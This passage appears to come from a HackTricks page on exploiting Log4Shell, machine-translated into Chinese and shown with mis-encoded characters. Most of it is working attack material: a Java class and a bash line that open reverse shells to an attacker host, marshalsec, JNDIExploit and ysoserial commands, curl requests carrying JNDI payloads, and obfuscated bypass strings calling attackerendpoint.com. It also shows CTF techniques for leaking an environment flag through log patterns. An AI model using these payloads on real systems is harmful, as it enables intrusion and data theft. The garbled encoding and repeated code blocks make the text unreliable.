è¦è·å–**æ›´å¤šä¿¡æ¯**ï¼ˆ_å¦‚ RMI å’Œ CORBA å‘é‡çš„é™åˆ¶_ï¼‰**è¯·æŸ¥çœ‹å‰é¢çš„ JNDI å‘½åå‚è€ƒéƒ¨åˆ†**æˆ– [https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)
{% endhint %}

### RCE - ä½¿ç”¨è‡ªå®šä¹‰è´Ÿè½½çš„ Marshalsec

_è¿™ä¸ªæŠ€å·§å®Œå…¨æ¥è‡ª **THM ç›’å­ï¼š**_ [_**https://tryhackme.com/room/solar**_](https://tryhackme.com/room/solar)___

åœ¨è¿™ä¸ªæ¼æ´ä¸­ï¼Œå°†ä½¿ç”¨å·¥å…· [**marshalsec**](https://github.com/mbechler/marshalsec)ï¼ˆä»è¿™é‡Œä¸‹è½½ [**jar ç‰ˆæœ¬**](https://github.com/RandomRobbieBF/marshalsec-jar)ï¼‰æ¥åˆ›å»ºä¸€ä¸ª LDAP referral æœåŠ¡å™¨ï¼Œä»¥å°†è¿æ¥å¼•å¯¼åˆ°æˆ‘ä»¬çš„æ¬¡çº§ HTTP æœåŠ¡å™¨ï¼Œé‚£é‡Œå°†æä¾›æ¼æ´åˆ©ç”¨ï¼š
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
```java
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("nc -e /bin/sh attacker_ip 4444");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
{% endcode %}

æˆ‘ä»¬å¸Œæœ›å—å®³è€…åŠ è½½å°†å‘æˆ‘ä»¬å‘é€åå‘ shell çš„ä»£ç ï¼Œå› æ­¤æ‚¨å¯ä»¥åˆ›å»ºä¸€ä¸ªåä¸º Exploit.java çš„ java æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š

{% code title="" %}
```java
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("nc -e /bin/sh attacker_ip 4444");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
{% endcode %}
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
{% endcode %}

åˆ›å»º**ç±»æ–‡ä»¶**æ‰§è¡Œï¼š`javac Exploit.java -source 8 -target 8`ï¼Œç„¶ååœ¨åˆ›å»ºç±»æ–‡ä»¶çš„åŒä¸€ç›®å½•ä¸‹è¿è¡Œ**HTTPæœåŠ¡å™¨**ï¼š`python3 -m http.server`ã€‚\
**marshalsecçš„LDAPæœåŠ¡å™¨åº”è¯¥æŒ‡å‘è¿™ä¸ªHTTPæœåŠ¡å™¨**ã€‚\
ç„¶åï¼Œæ‚¨å¯ä»¥é€šè¿‡å‘é€å¦‚ä¸‹è½½è·ï¼Œä½¿**æ˜“å—æ”»å‡»çš„WebæœåŠ¡å™¨æ‰§è¡Œexploitç±»**ï¼š
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
_è¯·æ³¨æ„ï¼Œå¦‚æœ Java æ²¡æœ‰é…ç½®ä¸ºä½¿ç”¨ LDAP åŠ è½½è¿œç¨‹ä»£ç åº“ï¼Œè¿™ä¸ªè‡ªå®šä¹‰æ¼æ´åˆ©ç”¨å°†ä¸èµ·ä½œç”¨ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨éœ€è¦æ»¥ç”¨ä¸€ä¸ªå—ä¿¡ä»»çš„ç±»æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚_

### RCE - **JNDIExploit**

{% hint style="info" %}
è¯·æ³¨æ„ï¼Œå‡ºäºæŸç§åŸå› ï¼Œä½œè€…åœ¨å‘ç° log4shell åä» github ä¸Šåˆ é™¤äº†è¿™ä¸ªé¡¹ç›®ã€‚æ‚¨å¯ä»¥åœ¨ [https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2) æ‰¾åˆ°ä¸€ä¸ªç¼“å­˜ç‰ˆæœ¬ï¼Œä½†å¦‚æœæ‚¨æƒ³å°Šé‡ä½œè€…çš„å†³å®šï¼Œè¯·ä½¿ç”¨ä¸åŒçš„æ–¹æ³•æ¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ã€‚

æ­¤å¤–ï¼Œæ‚¨åœ¨ wayback machine ä¸­æ‰¾ä¸åˆ°æºä»£ç ï¼Œæ‰€ä»¥è¦ä¹ˆåˆ†ææºä»£ç ï¼Œè¦ä¹ˆåœ¨çŸ¥é“æ‚¨ä¸çŸ¥é“æ‚¨æ­£åœ¨æ‰§è¡Œä»€ä¹ˆçš„æƒ…å†µä¸‹æ‰§è¡Œ jar æ–‡ä»¶ã€‚
{% endhint %}

åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæ‚¨å¯ä»¥åœ¨ç«¯å£ 8080 ä¸Šè¿è¡Œè¿™ä¸ª**å¯¹ log4shell æ¼æ´çš„æ˜“å—æ”»å‡»çš„ web æœåŠ¡å™¨**ï¼š[https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app)ï¼ˆ_åœ¨ README ä¸­æ‚¨ä¼šæ‰¾åˆ°å¦‚ä½•è¿è¡Œå®ƒ_ï¼‰ã€‚è¿™ä¸ªæ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºæ­£åœ¨ä½¿ç”¨ä¸€ä¸ªæ˜“å—æ”»å‡»ç‰ˆæœ¬çš„ log4shell è®°å½• HTTP è¯·æ±‚å¤´ _X-Api-Version_ çš„å†…å®¹ã€‚

ç„¶åï¼Œæ‚¨å¯ä»¥ä¸‹è½½ **JNDIExploit** jar æ–‡ä»¶å¹¶æ‰§è¡Œå®ƒï¼š
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
åœ¨é˜…è¯»ä»£ç å‡ åˆ†é’Ÿåï¼Œä½ å¯ä»¥åœ¨ _com.feihong.ldap.LdapServer_ å’Œ _com.feihong.ldap.HTTPServer_ ä¸­çœ‹åˆ°**LDAP å’Œ HTTP æœåŠ¡å™¨æ˜¯å¦‚ä½•åˆ›å»ºçš„**ã€‚LDAP æœåŠ¡å™¨å°†ç†è§£éœ€è¦æä¾›å“ªäº›æœ‰æ•ˆè½½è·ï¼Œå¹¶å°†å—å®³è€…é‡å®šå‘åˆ° HTTP æœåŠ¡å™¨ï¼Œåè€…å°†æä¾›æ¼æ´åˆ©ç”¨ç¨‹åºã€‚
åœ¨ _com.feihong.ldap.gadgets_ ä¸­ï¼Œä½ å¯ä»¥æ‰¾åˆ°**ä¸€äº›ç‰¹å®šçš„å°å·¥å…·**ï¼Œè¿™äº›å·¥å…·å¯ä»¥ç”¨æ¥æ‰§è¡Œæ‰€éœ€çš„æ“ä½œï¼ˆæ½œåœ¨åœ°æ‰§è¡Œä»»æ„ä»£ç ï¼‰ã€‚è€Œåœ¨ _com.feihong.ldap.template_ ä¸­ï¼Œä½ å¯ä»¥çœ‹åˆ°ä¸åŒçš„æ¨¡æ¿ç±»ï¼Œè¿™äº›ç±»å°†**ç”Ÿæˆæ¼æ´åˆ©ç”¨ç¨‹åº**ã€‚

ä½ å¯ä»¥é€šè¿‡**`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`** æŸ¥çœ‹æ‰€æœ‰å¯ç”¨çš„æ¼æ´åˆ©ç”¨ç¨‹åºã€‚ä¸€äº›æœ‰ç”¨çš„åŒ…æ‹¬ï¼š
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
å› æ­¤ï¼Œåœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å·²ç»æœ‰äº†æ­£åœ¨è¿è¡Œçš„dockeræ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºã€‚è¦æ”»å‡»å®ƒï¼š
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
åœ¨å‘é€æ”»å‡»æ—¶ï¼Œæ‚¨å°†åœ¨æ‰§è¡Œ **JNDIExploit-1.2-SNAPSHOT.jar** çš„ç»ˆç«¯ä¸­çœ‹åˆ°ä¸€äº›è¾“å‡ºã€‚

**è®°å¾—æ£€æŸ¥ `java -jar JNDIExploit-1.2-SNAPSHOT.jar -u` ä»¥è·å–å…¶ä»–åˆ©ç”¨é€‰é¡¹ã€‚æ­¤å¤–ï¼Œå¦‚æœéœ€è¦ï¼Œæ‚¨å¯ä»¥æ›´æ”¹LDAPå’ŒHTTPæœåŠ¡å™¨çš„ç«¯å£ã€‚**

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

ä¸ä¹‹å‰çš„æ¼æ´åˆ©ç”¨ç±»ä¼¼ï¼Œæ‚¨å¯ä»¥å°è¯•ä½¿ç”¨ [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) æ¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ã€‚\
æ‚¨å¯ä»¥ç”ŸæˆURLå¹¶å‘é€ç»™å—å®³è€…ï¼Œè¿è¡Œï¼š
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_æ­¤æ”»å‡»ä½¿ç”¨è‡ªå®šä¹‰ç”Ÿæˆçš„javaå¯¹è±¡åœ¨**THM solar room**ç­‰å®éªŒå®¤ä¸­æœ‰æ•ˆã€‚ç„¶è€Œï¼Œè¿™é€šå¸¸ä¸ä¼šèµ·ä½œç”¨ï¼ˆå› ä¸ºé»˜è®¤æƒ…å†µä¸‹Javaæ²¡æœ‰é…ç½®ä¸ºä½¿ç”¨LDAPåŠ è½½è¿œç¨‹ä»£ç åº“ï¼‰ï¼Œæˆ‘è®¤ä¸ºè¿™æ˜¯å› ä¸ºå®ƒæ²¡æœ‰æ»¥ç”¨å—ä¿¡ä»»çš„ç±»æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚_

### RCE - ysoserial & JNDI-Exploit-Kit

æ­¤é€‰é¡¹å¯¹äºæ”»å‡»**ä»…ä¿¡ä»»æŒ‡å®šç±»è€Œä¸æ˜¯æ‰€æœ‰ç±»çš„Javaç‰ˆæœ¬**éå¸¸æœ‰ç”¨ã€‚å› æ­¤ï¼Œ**ysoserial** å°†è¢«ç”¨æ¥ç”Ÿæˆ**å—ä¿¡ä»»ç±»çš„åºåˆ—åŒ–**ï¼Œè¿™äº›åºåˆ—åŒ–å¯ä»¥ä½œä¸ºå°å·¥å…·æ¥**æ‰§è¡Œä»»æ„ä»£ç **ï¼ˆ_è¢«ysoserialæ»¥ç”¨çš„å—ä¿¡ä»»ç±»å¿…é¡»è¢«å—å®³è€…javaç¨‹åºä½¿ç”¨ï¼Œä»¥ä¾¿æ¼æ´åˆ©ç”¨å·¥ä½œ_ï¼‰ã€‚

ä½¿ç”¨ **ysoserial** æˆ– [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified) ä½ å¯ä»¥åˆ›å»ºå°†ç”±JNDIä¸‹è½½çš„ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ï¼š
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
ä½¿ç”¨ [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) ç”Ÿæˆ **JNDI é“¾æ¥**ï¼Œåœ¨è¿™äº›é“¾æ¥ä¸Šï¼Œæ¼æ´æœºå™¨å°†ç­‰å¾…è¿æ¥ã€‚æ‚¨å¯ä»¥æä¾› **ä¸åŒçš„æ¼æ´åˆ©ç”¨ï¼Œè¿™äº›å¯ä»¥ç”± JNDI-Exploit-Kit è‡ªåŠ¨ç”Ÿæˆ**ï¼Œç”šè‡³æ˜¯æ‚¨è‡ªå·±çš„ **ååºåˆ—åŒ–æœ‰æ•ˆè½½è·**ï¼ˆç”±æ‚¨æˆ– ysoserial ç”Ÿæˆï¼‰ã€‚
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (642) (1) (1).png>)

ç°åœ¨ï¼Œæ‚¨å¯ä»¥è½»æ¾ä½¿ç”¨ç”Ÿæˆçš„JNDIé“¾æ¥æ¥åˆ©ç”¨æ¼æ´å¹¶é€šè¿‡å‘æ˜“å—æ”»å‡»çš„log4jç‰ˆæœ¬å‘é€ä»¥ä¸‹å†…å®¹æ¥è·å–**åå‘ shell**ï¼š**`${ldap://10.10.14.10:1389/generated}`**

### ç»•è¿‡
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:Ä±}}:ldap://...} //Notice the unicode "i"
```
### è‡ªåŠ¨æ‰«æå™¨

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - æŸ¥æ‰¾æœ¬åœ°æ˜“å—æ”»å‡»çš„åº“

### æµ‹è¯•å®éªŒå®¤

* [**LogForge HTB æœºå™¨**](https://app.hackthebox.com/tracks/UHC-track)
* [**å°è¯•é»‘å®¢æ”»å‡»æˆ‘ Solar æˆ¿é—´**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Post-Log4Shell æ¼æ´åˆ©ç”¨

åœ¨è¿™ä¸ª [**CTF å†™ä½œ**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) ä¸­å¾ˆå¥½åœ°è§£é‡Šäº†å¦‚ä½•æœ‰å¯èƒ½**æ»¥ç”¨** **Log4J** çš„æŸäº›åŠŸèƒ½ã€‚

Log4j çš„ [**å®‰å…¨é¡µé¢**](https://logging.apache.org/log4j/2.x/security.html) æœ‰ä¸€äº›æœ‰è¶£çš„å¥å­ï¼š

> ä»ç‰ˆæœ¬ 2.16.0ï¼ˆé€‚ç”¨äº Java 8ï¼‰å¼€å§‹ï¼Œ**æ¶ˆæ¯æŸ¥æ‰¾åŠŸèƒ½å·²è¢«å®Œå…¨ç§»é™¤**ã€‚**é…ç½®ä¸­çš„æŸ¥æ‰¾ä»ç„¶æœ‰æ•ˆ**ã€‚æ­¤å¤–ï¼ŒLog4j ç°åœ¨é»˜è®¤ç¦ç”¨å¯¹ JNDI çš„è®¿é—®ã€‚ç°åœ¨éœ€è¦æ˜ç¡®å¯ç”¨é…ç½®ä¸­çš„ JNDI æŸ¥æ‰¾ã€‚

> ä»ç‰ˆæœ¬ 2.17.0ï¼ˆä»¥åŠé€‚ç”¨äº Java 7 å’Œ Java 6 çš„ 2.12.3 å’Œ 2.3.1ï¼‰å¼€å§‹ï¼Œ**åªæœ‰é…ç½®ä¸­çš„æŸ¥æ‰¾å­—ç¬¦ä¸²ä¼šé€’å½’å±•å¼€**ï¼›åœ¨ä»»ä½•å…¶ä»–ç”¨é€”ä¸­ï¼Œåªè§£æé¡¶å±‚æŸ¥æ‰¾ï¼Œä»»ä½•åµŒå¥—çš„æŸ¥æ‰¾éƒ½ä¸ä¼šè¢«è§£æã€‚

è¿™æ„å‘³ç€é»˜è®¤æƒ…å†µä¸‹ä½ å¯ä»¥**å¿˜è®°ä½¿ç”¨ä»»ä½• `jndi` æ¼æ´**ã€‚æ­¤å¤–ï¼Œè¦æ‰§è¡Œ**é€’å½’æŸ¥æ‰¾**ï¼Œä½ éœ€è¦é…ç½®å®ƒä»¬ã€‚

ä¾‹å¦‚ï¼Œåœ¨é‚£ä¸ª CTF ä¸­ï¼Œè¿™æ˜¯åœ¨æ–‡ä»¶ log4j2.xml ä¸­é…ç½®çš„ï¼š
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### Env Lookups

åœ¨è¿™ä¸ªCTFä¸­ï¼Œæ”»å‡»è€…æ§åˆ¶äº†`${sys:cmd}`çš„å€¼ï¼Œå¹¶éœ€è¦ä»ç¯å¢ƒå˜é‡ä¸­çªƒå–flagã€‚\
å¦‚[**å…ˆå‰çš„payloads**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification)é¡µé¢æ‰€ç¤ºï¼Œæœ‰å‡ ç§ä¸åŒçš„æ–¹æ³•å¯ä»¥è®¿é—®ç¯å¢ƒå˜é‡ï¼Œä¾‹å¦‚ï¼š**`${env:FLAG}`**ã€‚åœ¨è¿™ä¸ªCTFä¸­è¿™æ˜¯æ— ç”¨çš„ï¼Œä½†åœ¨å…¶ä»–ç°å®ç”Ÿæ´»åœºæ™¯ä¸­å¯èƒ½ä¸æ˜¯ã€‚

### å¼‚å¸¸ä¸­çš„æ•°æ®çªƒå–

åœ¨CTFä¸­ï¼Œä½ **æ— æ³•è®¿é—®**ä½¿ç”¨log4Jçš„javaåº”ç”¨ç¨‹åºçš„stderrï¼Œä½†æ˜¯Log4Jçš„**å¼‚å¸¸è¢«å‘é€åˆ°stdout**ï¼Œè¿™ä¼šåœ¨pythonåº”ç”¨ç¨‹åºä¸­æ‰“å°å‡ºæ¥ã€‚è¿™æ„å‘³ç€è§¦å‘ä¸€ä¸ªå¼‚å¸¸æˆ‘ä»¬å¯ä»¥è®¿é—®å†…å®¹ã€‚ç”¨äºçªƒå–flagçš„ä¸€ä¸ªå¼‚å¸¸æ˜¯ï¼š**`${java:${env:FLAG}}`.** è¿™æœ‰æ•ˆæ˜¯å› ä¸º**`${java:CTF{blahblah}}`**ä¸å­˜åœ¨ï¼Œä¸”ä¼šæ˜¾ç¤ºå¸¦æœ‰flagå€¼çš„å¼‚å¸¸ï¼š

![](<../../.gitbook/assets/image (157).png>)

### è½¬æ¢æ¨¡å¼å¼‚å¸¸

ä»…ä»…æä¸€ä¸‹ï¼Œä½ ä¹Ÿå¯ä»¥æ³¨å…¥æ–°çš„[**è½¬æ¢æ¨¡å¼**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout)å¹¶è§¦å‘å°†è¢«è®°å½•åˆ°`stdout`çš„å¼‚å¸¸ã€‚ä¾‹å¦‚ï¼š

![](<../../.gitbook/assets/image (3) (2) (1) (1).png>)

è¿™åœ¨é”™è¯¯æ¶ˆæ¯ä¸­çªƒå–æ•°æ®æ—¶è¢«å‘ç°ä¸æœ‰ç”¨ï¼Œå› ä¸ºlookupåœ¨è½¬æ¢æ¨¡å¼ä¹‹å‰æ²¡æœ‰è¢«è§£å†³ï¼Œä½†å®ƒå¯èƒ½å¯¹å…¶ä»–äº‹æƒ…æœ‰ç”¨ï¼Œæ¯”å¦‚æ£€æµ‹ã€‚

### è½¬æ¢æ¨¡å¼æ­£åˆ™è¡¨è¾¾å¼

ç„¶è€Œï¼Œå¯ä»¥ä½¿ç”¨ä¸€äº›**æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼çš„è½¬æ¢æ¨¡å¼**é€šè¿‡ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å’Œæ»¥ç”¨**äºŒè¿›åˆ¶æœç´¢**æˆ–**åŸºäºæ—¶é—´çš„**è¡Œä¸ºæ¥çªƒå–lookupä¸­çš„ä¿¡æ¯ã€‚

* **é€šè¿‡å¼‚å¸¸æ¶ˆæ¯è¿›è¡ŒäºŒè¿›åˆ¶æœç´¢**

è½¬æ¢æ¨¡å¼**`%replace`**å¯ä»¥ç”¨æ¥**æ›¿æ¢**æ¥è‡ª**å­—ç¬¦ä¸²**çš„**å†…å®¹**ï¼Œç”šè‡³ä½¿ç”¨**æ­£åˆ™è¡¨è¾¾å¼**ã€‚å®ƒçš„å·¥ä½œåŸç†å¦‚ä¸‹ï¼š`replace{pattern}{regex}{substitution}`\
åˆ©ç”¨è¿™ç§è¡Œä¸ºï¼Œä½ å¯ä»¥è®©replaceåœ¨å­—ç¬¦ä¸²å†…éƒ¨çš„ä»»ä½•å†…å®¹**åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼æ—¶è§¦å‘å¼‚å¸¸**ï¼ˆå¦‚æœæ²¡æœ‰æ‰¾åˆ°åˆ™ä¸è§¦å‘å¼‚å¸¸ï¼‰ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **åŸºäºæ—¶é—´**

å¦‚å‰ä¸€èŠ‚æ‰€è¿°ï¼Œ**`%replace`** æ”¯æŒ **æ­£åˆ™è¡¨è¾¾å¼**ã€‚å› æ­¤ï¼Œå¯ä»¥ä½¿ç”¨ [**ReDoS é¡µé¢**](../regular-expression-denial-of-service-redos.md) ä¸Šçš„ payload æ¥å¼•èµ· **è¶…æ—¶**ï¼Œå¦‚æœæ‰¾åˆ°äº†æ ‡å¿—ã€‚\
ä¾‹å¦‚ï¼Œåƒ `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` è¿™æ ·çš„ payload ä¼šåœ¨é‚£ä¸ª CTF ä¸­è§¦å‘ **è¶…æ—¶**ã€‚

åœ¨è¿™ç¯‡ [**writeup**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) ä¸­ï¼Œå®ƒæ²¡æœ‰ä½¿ç”¨ ReDoS æ”»å‡»ï¼Œè€Œæ˜¯ä½¿ç”¨äº† **æ”¾å¤§æ”»å‡»** æ¥å¼•èµ·å“åº”æ—¶é—´çš„å·®å¼‚ï¼š

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> å¦‚æœæ ‡å¿—ä»¥ `flagGuess` å¼€å¤´ï¼Œæ•´ä¸ªæ ‡å¿—å°†è¢«æ›¿æ¢ä¸º 29 ä¸ª `#`ï¼ˆæˆ‘ä½¿ç”¨è¿™ä¸ªå­—ç¬¦æ˜¯å› ä¸ºå®ƒå¯èƒ½ä¸ä¼šæ˜¯æ ‡å¿—çš„ä¸€éƒ¨åˆ†ï¼‰ã€‚**ç„¶åï¼Œç»“æœä¸­çš„æ¯ä¸ª 29 ä¸ª `#` è¢«æ›¿æ¢ä¸º 54 ä¸ª `#`**ã€‚è¿™ä¸ªè¿‡ç¨‹é‡å¤ **6 æ¬¡**ï¼Œæ€»å…±æœ‰ `29*54*54^6* =`` `` `**`96816014208`  `#`ï¼**
>
> æ›¿æ¢è¿™ä¹ˆå¤šçš„ `#` å°†è§¦å‘ Flask åº”ç”¨ç¨‹åºçš„ 10 ç§’è¶…æ—¶ï¼Œè¿™åè¿‡æ¥å°†å¯¼è‡´ HTTP çŠ¶æ€ç  500 è¢«å‘é€ç»™ç”¨æˆ·ã€‚ï¼ˆå¦‚æœæ ‡å¿—ä¸æ˜¯ä»¥ `flagGuess` å¼€å¤´ï¼Œæˆ‘ä»¬å°†æ”¶åˆ°ä¸€ä¸ªé 500 çŠ¶æ€ç ï¼‰

## å‚è€ƒèµ„æ–™

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

æ‰¾åˆ°å¯¹æ‚¨æœ€é‡è¦çš„æ¼æ´ï¼Œä»¥ä¾¿æ›´å¿«ä¿®å¤ã€‚Intruder è·Ÿè¸ªæ‚¨çš„æ”»å‡»é¢ï¼Œè¿è¡Œä¸»åŠ¨å¨èƒæ‰«æï¼Œåœ¨æ‚¨çš„æ•´ä¸ªæŠ€æœ¯æ ˆä¸­æ‰¾åˆ°é—®é¢˜ï¼Œä» API åˆ° web åº”ç”¨ç¨‹åºå’Œäº‘ç³»ç»Ÿã€‚[**ä»Šå¤©å°±å…è´¹è¯•ç”¨**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)ã€‚

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æ”»å‡»ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„ **å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTs é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š **å…³æ³¨** æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
